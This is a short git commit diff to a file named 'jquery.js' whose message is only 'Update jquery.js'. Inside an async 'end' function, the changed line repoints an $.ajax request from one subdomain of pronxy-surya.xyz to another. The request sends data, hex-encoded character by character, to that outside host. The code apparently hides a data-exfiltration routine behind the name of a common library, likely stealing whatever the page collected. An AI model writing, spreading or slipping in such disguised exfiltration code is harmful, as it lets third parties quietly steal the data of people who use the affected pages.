30bdc28bc582b29ec3e9232e468045dbab4bc0e9
Ganzzhost <ganzzunban@gmail.com>
2024-12-31 01:07:01 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://jsganz.pronxy-surya.xyz/source/?json=" +
+                    "https://jsdcoding2.pronxy-surya.xyz/source/?json=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
